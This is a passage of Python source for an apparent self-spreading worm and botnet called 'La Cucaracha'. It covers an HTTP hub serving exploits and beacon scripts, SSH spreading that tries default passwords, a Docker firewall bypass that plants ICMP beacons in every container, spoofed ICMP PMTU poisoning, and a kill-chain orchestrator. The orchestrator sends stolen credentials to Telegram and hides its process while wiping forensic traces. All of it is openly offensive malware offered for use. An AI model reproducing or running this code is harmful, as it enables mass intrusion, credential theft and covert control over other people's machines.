                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"heel binary not found")
                elif path in ("copy_fail", "copy_fail.py"):
                    try:
                        src = open("/opt/hermes/exploits/copy_fail", "rb").read()
                        self.send_response(200)
                        self.send_header("Content-Type", "application/octet-stream")
                        self.send_header("Content-Disposition", 'attachment; filename="copy_fail"')
                        self.end_headers()
                        self.wfile.write(src)
                    except FileNotFoundError:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"copy_fail PoC not found")
                elif path in ("dirtyfrag", "dirtyfrag_exp"):
                    try:
                        src = open("/opt/hermes/exploits/dirtyfrag", "rb").read()
                        self.send_response(200)
                        self.send_header("Content-Type", "application/octet-stream")
                        self.send_header("Content-Disposition", 'attachment; filename="dirtyfrag"')
                        self.end_headers()
                        self.wfile.write(src)
                    except FileNotFoundError:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"dirtyfrag PoC not found")
                elif path == "worm_mesh_engine.py":
                    try:
                        src = open("/opt/hermes/worm_mesh_engine.py", "rb").read()
                        self.send_response(200)
                        self.send_header("Content-Type", "text/x-python")
                        self.send_header("Content-Disposition", 'attachment; filename="worm_mesh_engine.py"')
                        self.send_header("X-Worm-Version", "1.0.0")
                        self.end_headers()
                        self.wfile.write(src)
                    except FileNotFoundError:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"Worm engine not found")
                elif path in ("shell_beacon.sh", "mini_beacon.sh", "busybox_beacon.sh"):
                    beacon_paths = {
                        "shell_beacon.sh": os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads", "shell_beacon.sh"),
                        "mini_beacon.sh": os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads", "mini_beacon.sh"),
                        "busybox_beacon.sh": os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads", "busybox_beacon.sh"),
                    }
                    beacon_path = beacon_paths[path]
                    try:
                        content = open(beacon_path, "rb").read()
                        self.send_response(200)
                        self.send_header("Content-Type", "text/x-shellscript")
                        self.send_header("Content-Disposition", f'attachment; filename="{path}"')
                        self.end_headers()
                        self.wfile.write(content)
                    except FileNotFoundError:
                        self.send_response(200)
                        self.send_header("Content-Type", "text/x-shellscript")
                        self.end_headers()
                        beacon_script = f"#!/bin/sh\nC2_HOST=\"127.0.0.1\"\nC2_PORT=10001\nwhile true; do\n  (echo \"sh3ll_4cc3ss_b0rg_2026 worm-{path.replace('.sh','')}\"; sleep 10) | nc $C2_HOST $C2_PORT 2>/dev/null &\n  sleep 120\ndone\n"
                        self.wfile.write(beacon_script.encode())
                elif path == "":
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    available = []
                    for f in ["LaCucaracha.py", "worm_mesh_engine.py", "shell_beacon.sh", "mini_beacon.sh"]:
                        p = f"/opt/hermes/{f}" if f in ("LaCucaracha.py", "worm_mesh_engine.py") else f"/opt/chimera/{f}"
                        if os.path.exists(p):
                            available.append(f)
                    status = {
                        "service": "LaCucaracha Payload Hub",
                        "version": "BotnetInquisitor/v2",
                        "port": 10004,
                        "token_protected": True,
                        "files_available": available,
                        "db_targets": self.engine_ref.db.target_count(),
                        "db_nodes": self.engine_ref.db.node_count(),
                        "db_payloads": self.engine_ref.db.stats().get("payloads", 0),
                    }
                    self.wfile.write(json.dumps(status, indent=2).encode())
                else:
                    self.send_response(404)
                    self.end_headers()
                    self.wfile.write(b"404 - Not Found\n")

            def log_message(self, fmt, *args):
                log.debug(f"Hub: {fmt % args}")

        handler = type('Handler', (PayloadHandler,), {'engine_ref': self})
        try:
            socketserver.TCPServer.allow_reuse_address = True
            with socketserver.TCPServer((self.payload_hub_host, self.payload_hub_port),
                                         handler) as httpd:
                httpd.serve_forever()
        except OSError as exc:
            log.error(f"Payload hub bind error: {exc}")

    # ---- Peer Propagation ----

    def propagate_to_peer(self, peer_ip: str, node: WormNode,
                          payload: Dict) -> DeploymentReport:
        """Propagate payload to a mesh peer via SSH."""
        for username, password in [
            ("root", "root"), ("root", "admin"), ("admin", "admin"),
            ("root", ""), ("admin", ""),
        ]:
            result = self._deploy_via_wget(
                peer_ip, 22, (username, password), payload
            )
            if result.success:
                node.add_peer(peer_ip)
                return result
        return DeploymentReport(False, peer_ip, DeployMethod.PEER_PROPAGATION,
                                detail="No valid credential for peer propagation")

    # ---- Docker ICMP Egress Bypass (CVE-2026-12539) ----

    def _detect_docker(self, ip: str, port: int,
                       credential: Tuple[str, str]) -> Optional[Dict]:
        """SSH into target and detect Docker installation."""
        if not HAVE_PARAMIKO:
            return None
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=credential[0],
                           password=credential[1], timeout=10,
                           allow_agent=False, look_for_keys=False)
            check_cmd = (
                "docker --version 2>/dev/null && "
                "docker ps -q 2>/dev/null | wc -l && "
                "docker ps -q 2>/dev/null | head -20 && "
                "docker network ls --filter driver=bridge --format '{{.Name}}' 2>/dev/null | head -5"
            )
            _, stdout, stderr = client.exec_command(check_cmd, timeout=10)
            out = stdout.read().decode(errors="ignore").strip()
            client.close()
            if not out or "docker" not in out.lower():
                return None
            lines = [l.strip() for l in out.split("\n") if l.strip()]
            if len(lines) < 2:
                return None
            docker_version = lines[0]
            container_count = 0
            try:
                container_count = int(lines[1])
            except ValueError:
                pass
            container_ids = []
            bridge_network = "docker0"
            for line in lines[2:]:
                if line and len(line) < 64 and not line.startswith("bridge") and not line.startswith("host"):
                    if line.startswith("br-") or line.startswith("docker"):
                        bridge_network = line
                    elif all(c in "0123456789abcdef" for c in line.strip()):
                        container_ids.append(line.strip())
            return {
                "docker_version": docker_version,
                "container_count": container_count,
                "container_ids": json.dumps(container_ids[:20]),
                "bridge_network": bridge_network,
            }
        except Exception as exc:
            log.debug(f"Docker detect failed on {ip}:{port}: {exc}")
            return None

    def _bypass_docker_icmp_egress(self, ip: str, port: int,
                                    credential: Tuple[str, str],
                                    c2_ip: str = "127.0.0.1") -> bool:
        """Exploit CVE-2026-12539: Bypass Docker ICMP egress filtering."""
        if not HAVE_PARAMIKO:
            return False
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=credential[0],
                           password=credential[1], timeout=10,
                           allow_agent=False, look_for_keys=False)
            iptables_cmds = (
                "iptables -I DOCKER 1 -p icmp -d {c2} -j ACCEPT 2>/dev/null; "
                "iptables -I FORWARD 1 -i docker0 -p icmp -d {c2} -j ACCEPT 2>/dev/null; "
                "iptables -I FORWARD 1 -i docker0 -p icmp -j ACCEPT 2>/dev/null; "
                "if command -v nft &>/dev/null; then "
                "  nft add rule ip filter FORWARD iifname docker0 ip protocol icmp accept 2>/dev/null; "
                "  nft add rule ip filter DOCKER ip protocol icmp accept 2>/dev/null; "
                "fi; "
                "if command -v netfilter-persistent &>/dev/null; then "
                "  netfilter-persistent save 2>/dev/null || true; "
                "elif [ -f /etc/init.d/iptables ]; then "
                "  /etc/init.d/iptables save 2>/dev/null || true; "
                "fi; "
                "docker restart 2>/dev/null || "
                "systemctl restart docker 2>/dev/null || "
                "service docker restart 2>/dev/null || true; "
                "sleep 1; "
                "iptables -I DOCKER 1 -p icmp -d {c2} -j ACCEPT 2>/dev/null; "
                "iptables -I FORWARD 1 -i docker0 -p icmp -d {c2} -j ACCEPT 2>/dev/null; "
                "iptables -I FORWARD 1 -i docker0 -p icmp -j ACCEPT 2>/dev/null"
            ).format(c2=c2_ip)
            stdin, stdout, stderr = client.exec_command(iptables_cmds, timeout=15)
            exit_code = stdout.channel.recv_exit_status()
            out = stdout.read().decode(errors="ignore")
            err = stderr.read().decode(errors="ignore")
            beacon_script = (
                'python3 -c "'
                'import os,socket,struct,time; '
                'C2=\\"{c2}\\"; '
                'while True:'
                '  try:'
                '    s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP); '
                '    s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1); '
                '    pkt=struct.pack(\\"!BBHHH\\",8,0,0,os.getpid()&0xFFFF,1)+b\\"BCN\\"+str(time.time()).encode()[:45]; '
                '    csum=0; '
                '    for i in range(0,len(pkt),2): '
                '      csum+=((pkt[i]<<8)+(pkt[i+1] if i+1<len(pkt) else 0)); '
                '    csum=(csum>>16)+(csum&0xFFFF); '
                '    csum=~csum&0xFFFF; '
                '    pkt=struct.pack(\\"!BBHHH\\",8,0,csum,os.getpid()&0xFFFF,1)+b\\"BCN\\"+str(time.time()).encode()[:45]; '
                '    s.sendto(pkt,(C2,0)); '
                '    s.close(); '
                '  except: pass; '
                '  time.sleep(60)" &>/dev/null &'
            ).format(c2=c2_ip)
            deploy_cmd = (
                "for cid in $(docker ps -q 2>/dev/null); do "
                "  docker exec -d $cid sh -c '{beacon}' 2>/dev/null; "
                "  docker exec -d $cid bash -c '{beacon}' 2>/dev/null; "
                "done"
            ).format(beacon=beacon_script.replace('"', '\\"'))
            stdin, stdout, stderr = client.exec_command(deploy_cmd, timeout=30)
            stdout.channel.recv_exit_status()
            client.close()
            success = "ACCEPT" in out or exit_code == 0 or "ACCEPT" in err
            if success:
                self.db.log(f"CVE-2026-12539 bypass applied: {ip} -> containers can ICMP to {c2_ip}",
                            "INFO", "deploy")
            return success
        except Exception as exc:
            log.debug(f"Docker ICMP bypass failed on {ip}:{exc}")
            return False

    def deploy_docker_icmp_bypass(self, ip: str, port: int,
                                   credential: Tuple[str, str],
                                   c2_ip: str = "127.0.0.1") -> Dict:
        """Full CVE-2026-12539 exploitation chain."""
        result = {
            "ip": ip,
            "docker_found": False,
            "bypass_applied": False,
            "container_count": 0,
            "error": None,
        }
        docker_info = self._detect_docker(ip, port, credential)
        if not docker_info:
            result["error"] = "No Docker detected"
            return result
        result["docker_found"] = True
        result["container_count"] = docker_info["container_count"]
        result["container_ids"] = docker_info["container_ids"]
        bypass_ok = self._bypass_docker_icmp_egress(ip, port, credential, c2_ip)
        result["bypass_applied"] = bypass_ok
        try:
            host_id = str(uuid.uuid4())
            now = int(time.time())
            self.db.execute(
                "INSERT OR REPLACE INTO docker_hosts "
                "(id, ip, hostname, docker_version, container_count, container_ids, "
                " bridge_network, icmp_bypassed, last_check, created_at) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (host_id, ip, "", docker_info["docker_version"],
                 docker_info["container_count"], docker_info["container_ids"],
                 docker_info["bridge_network"], 1 if bypass_ok else 0,
                 now, now)
            )
            self.db.commit()
        except Exception as exc:
            log.debug(f"Docker host register error: {exc}")
        self.db.log(f"Docker ICMP bypass: {ip} — "
                    f"{'BY' if bypass_ok else 'NO'}-passed, "
                    f"{docker_info['container_count']} containers",
                    "INFO", "deploy")
        return result

    # ---- CVE-2026-0933: ICMP Path MTU Cache Corruption ----

    def deploy_pmtu_poison(self, ip: str, port: int,
                           credential: Tuple[str, str],
                           burst: int = 12) -> Dict[str, Any]:
        """CVE-2026-0933 deployment: check kernel version -> PMTU cache poison."""
        import uuid
        result: Dict[str, Any] = {
            "ip": ip,
            "cve": "CVE-2026-0933",
            "kernel_version": None,
            "vulnerable": False,
            "poison_sent": False,
            "packets_sent": 0,
            "error": None,
        }
        if not HAVE_PARAMIKO:
            result["error"] = "No paramiko"
            return result
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=credential[0],
                           password=credential[1], timeout=10,
                           allow_agent=False, look_for_keys=False)
            _, stdout, _ = client.exec_command("uname -r", timeout=5)
            kernel = stdout.read().decode(errors="ignore").strip()
            client.close()
        except Exception as exc:
            result["error"] = f"SSH failed: {exc}"
            return result
        result["kernel_version"] = kernel
        try:
            parts = kernel.split(".")
            major = int(parts[0])
            minor = int(parts[1]) if len(parts) > 1 else 0
            vulnerable = (major < 6) or (major == 6 and minor <= 8)
        except (ValueError, IndexError):
            vulnerable = False
        result["vulnerable"] = vulnerable
        if not vulnerable:
            result["error"] = f"Kernel {kernel} not vulnerable (need <= 6.8)"
            return result
        # Fire PMTU poison from C2 side
        try:
            poison_result = self._fire_pmtu_poison(ip, burst=burst)
            result["poison_sent"] = (poison_result.get("status") == "sent")
            result["packets_sent"] = poison_result.get("packets_sent", 0)
        except Exception as exc:
            result["error"] = f"PMTU poison failed: {exc}"
            return result
        # Deploy persistent PMTU poisoner script
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=credential[0],
                           password=credential[1], timeout=10,
                           allow_agent=False, look_for_keys=False)
            pmtu_script = (
                '#!/usr/bin/env python3\n'
                'import socket, struct, time, random\n'
                'MTUS = [68, 128, 256, 296, 384, 500, 552, 576, 628, 700]\n'
                'SRCS = [f"{random.choice([1,3,8,12,15,23,34,45,50,64,72,80,89,96,104,128,134,145,156,173,185,198,203,208])}'
                f'.{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(1,254)}" for _ in range(5)]\n'
                'while True:\n'
                '    for mtu in MTUS:\n'
                '        try:\n'
                '            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n'
                '            src = random.choice(SRCS)\n'
                '            s.sendto(struct.pack("!BBHHHBBHII", 0x45, 0, 40, 0, 0, 64, 1, 0, '
                '*(int(x) for x in src.split(".")), *(int(x) for x in "127.0.0.1".split("."))), ("127.0.0.1", 0))\n'
                '            s.close()\n'
                '        except: pass\n'
                '        time.sleep(0.1)\n'
                '    time.sleep(600)\n'
            )
            _, stdout, stderr = client.exec_command(
                f"cat > /tmp/.pmtu_poison.py << 'ENDPOISON'\n"
                f"{pmtu_script}\n"
                f"ENDPOISON\n"
                f"chmod +x /tmp/.pmtu_poison.py\n"
                f"nohup python3 /tmp/.pmtu_poison.py >/dev/null 2>&1 &\n",
                timeout=10
            )
            err = stderr.read().decode(errors="ignore").strip()
            if err:
                self.db.log(f"PMTU poison deploy stderr on {ip}: {err}", "DEBUG", "deploy")
            client.close()
        except Exception as exc:
            self.db.log(f"PMTU poison script deploy failed on {ip}: {exc}", "DEBUG", "deploy")
        # Register in pmtu_poisoned table
        try:
            host_id = str(uuid.uuid4())
            now = int(time.time())
            self.db.execute(
                "INSERT OR REPLACE INTO pmtu_poisoned "
                "(id, ip, kernel_version, packets_sent, last_poison, created_at) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                (host_id, ip, kernel, result["packets_sent"], now, now)
            )
            self.db.commit()
        except Exception as exc:
            log.debug(f"PMTU register error: {exc}")
        self.db.log(f"CVE-2026-0933: {ip} kernel={kernel} "
                    f"{'VULNERABLE' if vulnerable else 'PATCHED'} — "
                    f"sent {result['packets_sent']} poison packets",
                    "INFO", "deploy")
        return result

    def _fire_pmtu_poison(self, target: str, burst: int = 12) -> Dict:
        """Fire spoofed ICMP Frag Needed packets."""
        sent = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            for _ in range(burst):
                src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
                mtu = random.choice([68, 128, 256, 296, 384, 500, 552, 576])
                # ICMP Frag Needed (type 3, code 4)
                icmp_type = 3
                icmp_code = 4
                icmp_payload = struct.pack("!BBHHH", icmp_type, icmp_code, 0, 0, mtu) + b"\x00" * 8
                chk = 0
                for i in range(0, len(icmp_payload), 2):
                    if i + 1 < len(icmp_payload):
                        chk += (icmp_payload[i] << 8) + icmp_payload[i + 1]
                chk = (chk >> 16) + (chk & 0xFFFF)
                chk = ~chk & 0xFFFF
                icmp_payload = struct.pack("!BBHHH", icmp_type, icmp_code, chk, 0, mtu) + b"\x00" * 8
                ip_hdr = struct.pack("!BBHHHBBHII", 0x45, 0, 20 + len(icmp_payload), 0, 0, 64, 1, 0,
                                     *struct.unpack("!I", socket.inet_aton(src_ip))[0],
                                     *struct.unpack("!I", socket.inet_aton(target))[0])
                sock.sendto(ip_hdr + icmp_payload, (target, 0))
                sent += 1
            sock.close()
        except Exception as exc:
            log.debug(f"PMTU fire error: {exc}")
        return {"status": "sent" if sent > 0 else "failed", "packets_sent": sent}

    # ---- Orchestration ----

    def deploy_to_target(self, target: Dict, exploit_result: ExploitResult,
                         payload: Optional[Dict] = None) -> DeploymentReport:
        """Execute the best deployment method for a successfully exploited target."""
        if payload is None:
            variants = self.payload_generator.generate_all(persist=True)
            payload = random.choice(variants)
        ip = target["ip"]
        port = int(target.get("port", 22))
        methods: List[tuple] = []

        # Safe field access — handles both old namedtuple and new dataclass
        e_type = getattr(exploit_result, 'exploit_type', 'custom')
        credential = getattr(exploit_result, 'credential', None)
        if not credential or not credential[0]:
            uname = getattr(exploit_result, 'username', '')
            credential = (uname, '') if uname else None

        # SSH-based exploit types
        if e_type in ('ssh_brute', 'ssh_key') or (port == 22 and credential):
            if credential:
                methods.append((DeployMethod.SSH_PUSH, self._deploy_ssh_push,
                                (ip, port, credential, payload)))
                methods.append((DeployMethod.SSH_EXEC, self._deploy_ssh_exec,
                                (ip, port, credential, payload)))
            methods.append((DeployMethod.WGET_CURL, self._deploy_via_wget,
                            (ip, port, credential, payload)))

        # Telnet exploit types (CVE-2026, auth bypass, or telnet port)
        if e_type in ('telnet_bypass', 'telnet_cve_2026') or port in (23, 2323):
            if credential:
                methods.append((DeployMethod.SSH_PUSH, self._deploy_ssh_push,
                                (ip, 22, credential, payload)))
                methods.append((DeployMethod.WGET_CURL, self._deploy_via_wget,
                                (ip, 22, credential, payload)))

        # Web exploit types (RCE, LFI, IoT web panels)
        if e_type in ('web_rce', 'web_lfi', 'web_iot') or port in (80, 443, 8080, 8443, 8081):
            methods.append((DeployMethod.WEB_UPLOAD, self._deploy_web_upload,
                            (ip, port, payload)))
            methods.append((DeployMethod.WGET_CURL, self._deploy_via_wget,
                            (ip, port, None, payload)))

        for method, func, args in methods:
            if self._stop_flag:
                break
            try:
                result = func(*args)
                if result.success:
                    if credential:
                        try:
                            self.deploy_docker_icmp_bypass(
                                ip, port, credential
                            )
                        except Exception:
                            pass
                        try:
                            self.deploy_pmtu_poison(
                                ip, port, credential
                            )
                        except Exception:
                            pass
                    return result
            except Exception as exc:
                log.debug(f"Deploy {method.value} failed on {ip}:{port}: {exc}")
                continue
        return DeploymentReport(False, ip, DeployMethod.PAYLOAD_HUB,
                                detail="All deployment methods exhausted")
#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  La Cucaracha Section G — WormMeshEngine & main() Orchestrator             ║
║                                                                              ║
║  Concatenation order: A->B->C->D->E->F->G                                   ║
║                                                                              ║
║  Contains:                                                                   ║
║    - WormMeshEngine — master orchestrator tying all engines together         ║
║    - WormMaster — advanced orchestrator with all WormMaster flags            ║
║    - main() — complete CLI dispatch with ALL base engine + WormMaster flags  ║
║                                                                              ║
║  All class references resolve via concatenation order A->B->C->D->E->F->G.  ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import re
import json
import time
import uuid
import base64
import random
import struct
import socket
import hashlib
import logging
import threading
import subprocess
import ipaddress
import argparse
from typing import Dict, List, Optional, Any, Tuple, Set, Callable
from enum import Enum
from dataclasses import dataclass, field

log = logging.getLogger("worm.secG")

# ===================================================================
# SmartDecisionEngine — IF/THEN Decision Layer + Per-Action TG Reports
# ===================================================================

class SmartDecisionEngine:
    """IF/THEN decision engine for every worm action.
    
    Every kill-chain action:
    1. Reports intent to Telegram BEFORE execution
    2. Executes
    3. Evaluates result with if/then/else rules
    4. Reports outcome to Telegram AFTER execution
    5. Returns next action decision
    
    Adaptive timing: back off on empty scans, press harder on hot streaks.
    """
    
    def __init__(self, telegram_callback=None):
        self.tg = telegram_callback
        self.action_history = []
        self.consecutive_empty = 0
        self.consecutive_hits = 0
        self._last_action_time = 0.0
        self._min_report_interval = 0.3  # 300ms between per-action reports
        self.aggressive = False  # 🔥 Aggressive mode flag (set via Telegram bot)
        self.predator = False    # 🐉 Predator mode flag (set via Telegram bot)
        
    def set_tg(self, cb):
        """Set or replace the Telegram callback."""
        self.tg = cb
        
    def report(self, msg: str) -> None:
        """Immediate Telegram report — bypasses rate limiter for per-action."""
        if self.tg:
            try:
                self.tg(msg)
            except Exception:
                pass
                
    def report_action(self, action: str, target: str, status: str, detail: str = "") -> None:
        """Report a single action to Telegram immediately."""
        emoji_map = {
            'SCAN': '📡', 'ICMP': '📡', 'TCP': '🔍', 'FINGERPRINT': '🖥️',
            'EXPLOIT': '💥', 'PWN': '🔓', 'DEPLOY': '📦', 'SPREAD': '🕸️',
            'TRADE': '🔄', 'SLEEP': '💤', 'SKIP': '⏭️', 'DECIDE': '🧠',
            'DISCOVER': '🎯', 'ROTATE': '🔄', 'ALERT': '⚡', 'RATE_LIMIT': '🐢',
        }
        emoji = emoji_map.get(action, '⚡')
        status_icon = '✅' if 'SUCCESS' in status.upper() or 'PWN' in status.upper() or 'OK' in status.upper() else '❌' if 'FAIL' in status.upper() or 'DEAD' in status.upper() else '⏳'
        timestamp = datetime.datetime.now().strftime('%H:%M:%S')
        
        if detail:
            report = (
                f"```\n"
                f"╔══ {emoji} {action} ══╗\n"
                f"║  {status_icon} {status:<20}\n"
                f"║  🎯 {target:<28}\n"
                f"║  📝 {detail}\n"
                f"╚{'═'*30}╝\n"
                f"```"
            )
        else:
            report = (
                f"```\n"
                f"╔══ {emoji} {action} ══╗\n"
                f"║  {status_icon} {status:<20}\n"
                f"║  🎯 {target:<28}\n"
                f"╚{'═'*30}╝\n"
                f"```"
            )
        self.report(report)
        
    def decide(self, action: str, result: dict, context: dict = None) -> tuple:
        """IF/THEN decision engine.
        
        Args:
            action: The action that was just completed
            result: {'count': N, 'success': bool, 'partial': bool, ...}
            context: Optional context dict
            
        Returns:
            (next_action, params_dict)
        """
        # Log action to history
        entry = {
            'action': action,
            'result': result,
            'context': context or {},
            'time': time.time(),
        }
        self.action_history.append(entry)
        
        # Track consecutive patterns for adaptive behavior
        count = result.get('count', 0)
        success = result.get('success', False)
        partial = result.get('partial', False)
        errors = result.get('errors', 0)
        
        if count == 0 and not success and not partial:
            self.consecutive_empty += 1
            self.consecutive_hits = 0
        elif count > 0 or success:
            self.consecutive_hits += 1
            self.consecutive_empty = 0
            
        # ================ IF/THEN RULES ================
        
        if action == 'DISCOVER':
            # IF we found targets THEN exploit
            # IF no targets AND consecutive empty >= 2 THEN rotate subnet
            # IF no targets AND < 2 consecutive empty THEN try again
            if count > 0:
                self.report_action('DECIDE', 'Scan Result', 'SWITCH TO EXPLOIT', f'Found {count} targets')
                # Send target list for visibility
                targets_list = result.get('targets', [])[:5]
                if targets_list:
                    self.report(
                        f"```\n"
                        f"╔══ 🎯 DISCOVERED HOSTS ══╗\n"
                        + "\n".join(f"║  • {t}" for t in targets_list) + "\n"
                        f"║  ... +{count - len(targets_list)} more" if count > len(targets_list) else ""
                        f"╚{'═'*28}╝\n"
                        f"```"
                    )
                return ('EXPLOIT', {'scope': result.get('targets', [])})
            elif self.consecutive_empty >= 2:
                self.report_action('ROTATE', 'Empty Subnet', f'{self.consecutive_empty}x no hosts', 'Rotating to new subnet')
                return ('DISCOVER', {'rotate': True, 'reason': f'{self.consecutive_empty}x consecutive empty'})
            else:
                self.report_action('SCAN', 'Retry', f'No hosts (attempt {self.consecutive_empty+1})', 'Rescanning same range')
                return ('DISCOVER', {'retry': True})
                
        elif action == 'EXPLOIT':
            # IF pwned > 0 THEN deploy
            # IF 0 pwned BUT partial creds found THEN try expanded creds
            # IF 0 pwned AND 0 partial THEN go back to discovery
            pwned = count
            if pwned > 0:
                pwned_list = result.get('targets', [])
                self.report_action('PWN', f'{pwned} hosts', f'SUCCESS', f'{pwned} hosts pwned this batch')
                # Detail each pwned host
                for p in pwned_list[:5]:
                    ip = p.get('ip', p.get('target', ''))
                    port = p.get('port', 22)
                    user = p.get('username', p.get('user', ''))
                    pwd = p.get('password', p.get('pass', ''))
                    if ip:
                        self.report(
                            f"```\n"
                            f"╔══ 🔓 PWNED ══╗\n"
                            f"║  🖥️ {ip:<24}\n"
                            f"║  🔌 {port:<5} {'🔑' if user else '💀'}\n"
                            + (f"║  👤 {user}:{pwd}" if user and pwd else "") + "\n"
                            f"╚{'═'*30}╝\n"
                            f"```"
                        )
                return ('DEPLOY', {'targets': result.get('targets', [])})
            elif partial:
                self.report_action('EXPLOIT', 'Partial Creds', 'PARTIAL', 'Expanding credential pool')
                return ('EXPLOIT', {'expand_creds': True})
            elif errors > 5:
                self.report_action('RATE_LIMIT', 'Target', f'{errors} errors', 'Rate limited or firewalled')
                return ('SLEEP', {'reason': 'Rate limited', 'duration': 60})
            else:
                self.report_action('EXPLOIT', 'No pwns', 'FAILED', 'No creds matched')
                return ('DISCOVER', {'rotate': True, 'reason': 'No exploit success'})
                
        elif action == 'DEPLOY':
            deployed = count
            if deployed > 0:
                self.report_action('DEPLOY', f'{deployed} agents', 'SUCCESS', f'Deployed to {deployed} hosts')
                return ('SPREAD', {'targets': result.get('targets', [])})
            else:
                self.report_action('DEPLOY', 'Deploy', 'FAILED', 'Deployment vector failed')
                return ('EXPLOIT', {'retry': True, 'reason': 'Deploy failed'})
                
        elif action == 'SPREAD':
            spread = count
            if spread > 0:
                self.report_action('SPREAD', f'{spread} nodes', 'SUCCESS', f'Mesh expanded by {spread}')
                return ('TRADE', {})
            else:
                return ('TRADE', {'skip': True})
                
        elif action == 'TRADE':
            trades = result.get('trades', 0)
            mutations = result.get('mutations', 0)
            if trades > 0 or mutations > 0:
                self.report_action('TRADE', f'{trades} trades, {mutations} mutations', 'COMPLETE', 'Evolution cycle done')
            sleep_duration = self._get_adaptive_sleep()
            return ('SLEEP', {'duration': sleep_duration, 'reason': 'Cycle complete'})
            
        elif action == 'SLEEP':
            if self.consecutive_hits > 5:
                self.report_action('SLEEP', 'Waking', 'HOT STREAK', f'{self.consecutive_hits} consecutive hits')
                return ('DISCOVER', {'eager': True})
            elif self.consecutive_empty > 3:
                self.report_action('SLEEP', 'Waking', 'COLD', f'{self.consecutive_empty}x empty, trying fresh')
                return ('DISCOVER', {'rotate': True})
            else:
                return ('DISCOVER', {})
                
        # Default fallback
        return ('SLEEP', {'duration': 30, 'reason': 'No rule matched'})
        
    def _get_adaptive_sleep(self) -> int:
        """Adaptive sleep based on recent performance.
        
        IF hot streak → short sleep (keep momentum)
        IF cold streak → long sleep (avoid hammering dead targets)
        IF neutral → normal sleep
        """
        if self.consecutive_hits > 10:
            return random.randint(5, 15)      # Hot: short nap
        elif self.consecutive_hits > 3:
            return random.randint(15, 30)     # Warm: medium rest
        elif self.consecutive_empty > 5:
            return random.randint(120, 300)   # Ice cold: long hibernation
        elif self.consecutive_empty > 2:
            return random.randint(60, 120)    # Cold: extended rest
        else:
            return random.randint(20, 45)     # Normal: standard pause


# ===================================================================
# WormMeshEngine — Master Orchestrator
# ===================================================================

@dataclass
class WormMeshEngine:
    """Master orchestrator for the worm mesh.

    Coordinates all sub-engines to execute the full kill chain:
      1. Reconnaissance (target discovery)
      2. Exploitation (credential theft & access)
      3. Payload generation (polymorphic mutation)
      4. Deployment (multi-vector propagation)
      5. Mesh expansion (peer-to-peer spreading)
      6. Trading & mutation (evolutionary adaptation)

    Uses Monte Carlo PRNG for probabilistic spreading behavior to
    avoid deterministic detection patterns.
    """
    db: Database = field(default_factory=Database)
    recon_engine: WormReconEngine = field(default_factory=WormReconEngine)
    exploit_engine: WormExploitEngine = field(default_factory=WormExploitEngine)
    payload_generator: PolymorphicPayloadGenerator = field(default_factory=PolymorphicPayloadGenerator)
    deployment_engine: WormDeploymentEngine = field(default_factory=WormDeploymentEngine)
    icmp_engine: Optional[ICMPEngine] = None
    node: Optional[WormNode] = None
    _stop_flag: bool = False
    _monte_carlo_seed: int = 0
    _adaptive_payload: bool = False
    _ddos_on_obstacle: bool = False
    telegram_callback: Optional[Callable[[str], None]] = None
    _last_report: float = 0.0
    _report_interval: float = 1.0  # Minimum seconds between reports
    decision_engine: Optional[SmartDecisionEngine] = None
    _action_reports: bool = True  # Enable per-action Telegram reports
    aggressive_mode: bool = False  # 🔥 Aggressive mode — tighter cycles, skip MC
    predator_mode: bool = False    # 🐉 Predator mode — max aggression

    def __post_init__(self):
        self._monte_carlo_seed = random.randint(0, 2 ** 32)
        self.icmp_engine = ICMPEngine(self.db, timeout=2, rate_limit=50)
        self._icmp_task_thread: Optional[threading.Thread] = None
        self._icmp_task_running = False

        # ---- CKAB Stealth Initialization ------------------------------------
        self._stealth_mode = False
        self._stealth_proxy = STEALTH if HAVE_STEALTH else None
        self._in_memory = False

        if HAVE_STEALTH and os.environ.get("CKAB_STEALTH", "").lower() in ("1", "true", "yes"):
            self._stealth_mode = True
            self.db.log("Stealth mode ENABLED", "INFO", "stealth")
            if detect_debugging():
                self.db.log("Debugging/sandbox detected — worm is exposed!", "WARNING", "stealth")
            if hide_process():
                self.db.log("Process hidden (/proc overlay + kernel thread name)", "INFO", "stealth")
            anti_forensics()
            self.db.log("Anti-forensics cleanup complete", "INFO", "stealth")
        
        # ---- Initialize SmartDecisionEngine ----
        self.decision_engine = SmartDecisionEngine(telegram_callback=self.telegram_callback)
        self._last_exploit_results: List = []  # Buffer for DEPLOY phase
        self._partial_creds_seen: bool = False  # Flag for partial cred detection

    def stop(self) -> None:
        """Gracefully stop all engines."""
        self._stop_flag = True
        self.recon_engine.stop()
        self.exploit_engine.stop()
        self.deployment_engine.stop()
        if self.icmp_engine:
            self.icmp_engine.stop()

    def reset(self) -> None:
        self._stop_flag = False
        self.recon_engine.reset_stop()
